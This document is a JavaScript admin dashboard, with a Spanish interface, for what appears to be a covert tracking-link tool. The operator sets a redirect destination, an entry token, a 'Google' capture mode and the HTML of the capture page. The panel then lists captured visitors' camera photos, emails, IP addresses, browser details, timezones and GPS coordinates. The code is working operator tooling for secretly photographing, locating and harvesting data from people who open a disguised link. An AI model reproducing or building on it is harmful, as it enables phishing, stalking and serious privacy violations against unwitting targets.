(function () {
  var loginView = document.getElementById('loginView');
  var dashboardView = document.getElementById('dashboardView');
  var currentPage = 1;
  var totalPages = 1;

  function el(id) {
    return document.getElementById(id);
  }

  function fmtDate(utc) {
    if (!utc) return '—';
    try {
      var d = new Date(utc.replace(' ', 'T') + 'Z');
      return d.toLocaleString();
    } catch (e) {
      return utc;
    }
  }

  function escapeHtml(s) {
    if (s === null || s === undefined) return '';
    return String(s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function truncate(s, n) {
    if (!s) return '—';
    return s.length > n ? s.slice(0, n) + '…' : s;
  }

  function showLogin() {
    loginView.hidden = false;
    dashboardView.hidden = true;
  }

  function showDashboard(username) {
    loginView.hidden = true;
    dashboardView.hidden = false;
    el('currentUser').textContent = username;
    loadSettings();
    loadCaptures();
  }

  function api(path, options) {
    return fetch(path, options).then(function (r) {
      return r.json().catch(function () {
        return {};
      }).then(function (data) {
        if (!r.ok) throw new Error(data.error || 'Error de servidor');
        return data;
      });
    });
  }

  function updateCaptureLink() {
    var token = el('entryToken').value.trim();
    el('captureLink').value = window.location.origin + '/r/' + token;
  }

  function loadSettings() {
    api('/admin/api/settings').then(function (data) {
      el('destinationUrl').value = data.destination_url || '';
      el('entryToken').value = data.entry_token || '';
      el('googleClientId').value = data.google_client_id || '';
      var mode = data.capture_mode === 'google' ? 'google' : 'normal';
      document.querySelectorAll('input[name="captureMode"]').forEach(function (r) {
        r.checked = r.value === mode;
      });
      updateCaptureLink();
    }).catch(function () {
      location.reload();
    });
    api('/admin/api/capture-html').then(function (data) {
      el('captureHtmlEditor').value = data.html || '';
    }).catch(function () {
      location.reload();
    });
  }

  function loadCaptures() {
    api('/admin/api/captures?page=' + currentPage).then(function (data) {
      var grid = el('grid');
      var empty = el('emptyState');
      grid.innerHTML = '';
      el('totalBadge').textContent = data.total;

      totalPages = Math.max(1, Math.ceil(data.total / data.perPage));
      currentPage = Math.min(currentPage, totalPages);
      el('pageInfo').textContent = 'Página ' + currentPage + ' de ' + totalPages;
      el('prevPage').disabled = currentPage <= 1;
      el('nextPage').disabled = currentPage >= totalPages;

      if (!data.captures.length) {
        empty.hidden = false;
        return;
      }
      empty.hidden = true;

      data.captures.forEach(function (c) {
        var card = document.createElement('div');
        card.className = 'capture-card';

        var media = c.filename
          ? '<img src="/captures/' + encodeURIComponent(c.filename) + '" loading="lazy" alt="Captura">'
          : '<div class="no-photo">Sin foto (permiso denegado)</div>';

        var coords = c.lat !== null && c.lng !== null
          ? c.lat + ', ' + c.lng
          : '—';

        card.innerHTML =
          media +
          '<div class="meta">' +
          (c.email ? '<div><strong>Email:</strong> ' + escapeHtml(c.email) + '</div>' : '') +
          '<div><strong>IP:</strong> ' + escapeHtml(c.ip || '—') + '</div>' +
          '<div><strong>Referrer:</strong> ' + escapeHtml(truncate(c.referrer, 60)) + '</div>' +
          '<div><strong>Navegador:</strong> ' + escapeHtml(truncate(c.user_agent, 60)) + '</div>' +
          '<div><strong>Idioma:</strong> ' + escapeHtml(c.lang || '—') + '</div>' +
          '<div><strong>Zona:</strong> ' + escapeHtml(c.tz || '—') + '</div>' +
          '<div><strong>Ubicación:</strong> ' + escapeHtml(coords) + '</div>' +
          '<div class="date">' + fmtDate(c.created_at) + '</div>' +
          '</div>';

        grid.appendChild(card);
      });
    }).catch(function () {
      location.reload();
    });
  }

  el('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var username = el('username').value.trim();
    var password = el('password').value;
    api('/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: username, password: password })
    }).then(function () {
      el('loginError').textContent = '';
      showDashboard(username);
    }).catch(function (err) {
      el('loginError').textContent = err.message;
    });
  });

  el('logoutBtn').addEventListener('click', function () {
    api('/admin/logout', { method: 'POST' }).then(function () {
      location.reload();
    });
  });

  el('settingsForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var destinationUrl = el('destinationUrl').value.trim();
    var entryToken = el('entryToken').value.trim();
    var mode = 'normal';
    document.querySelectorAll('input[name="captureMode"]').forEach(function (r) {
      if (r.checked) mode = r.value;
    });
    api('/admin/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        destination_url: destinationUrl,
        entry_token: entryToken,
        capture_mode: mode,
        google_client_id: el('googleClientId').value.trim()
      })
    }).then(function (data) {
      el('destinationUrl').value = data.destination_url;
      el('entryToken').value = data.entry_token;
      el('googleClientId').value = data.google_client_id || '';
      updateCaptureLink();
      var msg = el('settingsMsg');
      msg.textContent = 'Cambios guardados.';
      setTimeout(function () {
        msg.textContent = '';
      }, 3000);
    }).catch(function (err) {
      var msg = el('settingsMsg');
      msg.textContent = err.message;
      msg.className = 'error';
      setTimeout(function () {
        msg.textContent = '';
        msg.className = 'success';
      }, 3000);
    });
  });

  el('prevPage').addEventListener('click', function () {
    if (currentPage > 1) {
      currentPage--;
      loadCaptures();
    }
  });

  el('nextPage').addEventListener('click', function () {
    if (currentPage < totalPages) {
      currentPage++;
      loadCaptures();
    }
  });

  el('entryToken').addEventListener('input', updateCaptureLink);

  el('htmlForm').addEventListener('submit', function (e) {
    e.preventDefault();
    api('/admin/api/capture-html', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ html: el('captureHtmlEditor').value })
    }).then(function () {
      var msg = el('htmlMsg');
      msg.textContent = 'HTML guardado.';
      setTimeout(function () {
        msg.textContent = '';
      }, 3000);
    }).catch(function (err) {
      var msg = el('htmlMsg');
      msg.textContent = err.message;
      msg.className = 'error';
      setTimeout(function () {
        msg.textContent = '';
        msg.className = 'success';
      }, 3000);
    });
  });

  el('resetHtmlBtn').addEventListener('click', function () {
    api('/admin/api/capture-html/reset', { method: 'POST' }).then(function (data) {
      el('captureHtmlEditor').value = data.html || '';
      var msg = el('htmlMsg');
      msg.textContent = 'HTML por defecto restaurado.';
      setTimeout(function () {
        msg.textContent = '';
      }, 3000);
    }).catch(function (err) {
      var msg = el('htmlMsg');
      msg.textContent = err.message;
      msg.className = 'error';
    });
  });

  el('copyLinkBtn').addEventListener('click', function () {
    var input = el('captureLink');
    input.select();
    input.setSelectionRange(0, 99999);
    var done = function () {
      input.value = 'Enlace copiado';
      setTimeout(function () {
        updateCaptureLink();
      }, 1500);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(input.value).then(done);
    } else {
      try {
        document.execCommand('copy');
        done();
      } catch (e) {
        input.value = 'Selecciona y copia manualmente';
        setTimeout(function () {
          updateCaptureLink();
        }, 2500);
      }
    }
  });

  api('/admin/api/me').then(function (data) {
    if (data.authenticated) {
      showDashboard(data.username);
    } else {
      showLogin();
    }
  });
})();
